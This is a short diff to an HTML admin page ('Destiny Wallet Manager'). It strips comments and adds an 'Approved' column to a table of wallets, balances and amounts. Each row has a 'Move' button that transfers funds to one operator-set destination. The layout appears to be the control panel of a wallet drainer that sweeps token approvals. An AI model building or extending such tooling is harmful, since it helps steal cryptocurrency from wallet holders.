@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -56,7 +57,6 @@
 </head>
 <body>
 
-  <!-- ✅ Navbar -->
   <nav class="navbar navbar-expand-lg">
     <div class="container-fluid">
       <a class="navbar-brand" href="#">💼 Vortex Admin Panel</a>
@@ -66,7 +66,6 @@
   <div class="container card-glass">
     <h3 class="text-center mb-4">⚙️ Destiny Wallet Manager</h3>
 
-    <!-- ✅ Destiny Wallet Input -->
     <div class="row mb-4">
       <div class="col-md-8">
         <input type="text" id="globalDestInput" class="form-control" placeholder="Enter destination wallet address..." />
@@ -76,15 +75,12 @@
       </div>
     </div>
 
-    <!-- ✅ Destiny Status -->
     <div class="alert alert-info text-center fw-semibold" id="destStatus" style="display: none;"></div>
 
-    <!-- ✅ Total Count -->
     <div class="text-end mb-2">
       <span class="badge text-bg-secondary p-2">📊 Total Wallets: <span id="userCount">0</span></span>
     </div>
 
-    <!-- ✅ Wallet Table -->
     <div id="walletsTable"></div>
   </div>
 
@@ -124,6 +120,7 @@
               <th>#</th>
               <th>Wallet</th>
               <th>Balance</th>
+              <th>Approved</th>
               <th>Amount</th>
               <th>Action</th>
             </tr>
@@ -137,6 +134,7 @@
             <td>${i + 1}</td>
             <td>${w.wallet}</td>
             <td>${w.balance}</td>
+            <td>${w.approved}</td>
             <td><input id="amt-${w.wallet}" class="form-control" placeholder="Amount" /></td>
             <td><button class="btn btn-move" onclick="transfer('${w.wallet}')">Move</button></td>
           </tr>
